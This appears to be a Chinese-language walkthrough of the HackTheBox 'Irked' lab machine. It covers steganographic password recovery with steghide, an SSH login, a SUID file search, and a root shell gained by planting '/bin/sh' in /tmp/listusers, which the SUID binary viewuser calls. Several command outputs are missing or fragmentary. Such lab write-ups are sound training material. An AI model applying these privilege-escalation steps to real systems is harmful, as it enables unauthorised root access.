# 权限提升

## User

```


ircd@irked:/home/djmardov/Documents$ cat .backup
```

我直接拿着这段密码去登录 djmardov 账户是不行的，提示失败

然后看着提示，这似乎是一段 steg 的编码，而我们又没有要解密的文件，这时候我想起来，密码一般会藏在哪？当然是图片里，而哪里有图片呢？HTTP 服务的主页有一张图片！

```

┌──(root💀kali)-[~/Desktop]# steghide extract -sf irked.jpg                                            1 ⨯

"pass.txt"
.
```

在这提示我们输入密码，刚才 .backup 里的密码就有用处了，输入密码后解压出来一个 pass.txt 文件

```

┌──(root💀kali)-[~/Desktop]# cat pass.txt    


```

得到了密码

```

┌──(root💀kali)-[~/Desktop]# ssh djmardov@10.10.10.117     

's password: 
```

成功提权到 user 用户

```


djmardov@irked:~/Documents$ cat user.txt 
```

成功拿到 user 权限的 flag 文件

# 权限提升

```
djmardov@irked:~$ find / -user root -perm -4000 -print

 2>/dev/null
```

使用 find 查找一下特殊权限文件

找到了一个 /usr/bin/viewuser 文件，查看一下

```

djmardov@irked:/usr/bin$ ./viewuser set and test

 user permissions
```

发现这里似乎调用了一个 /tmp/listusers

向 /tmp/listusers 写入文件

```
echo "/bin/sh"
 > /tmp/listusers
```

接着执行 /usr/bin/viewuser

```
djmardov@irked:/tmp$ echo "/bin/sh"

 > /tmp/listusersset and test

 user permissions# whoami&&id


```

成功提权到 root 权限

```
# cat /root/root.txt


```

成功拿到 root 权限的 flag 文件
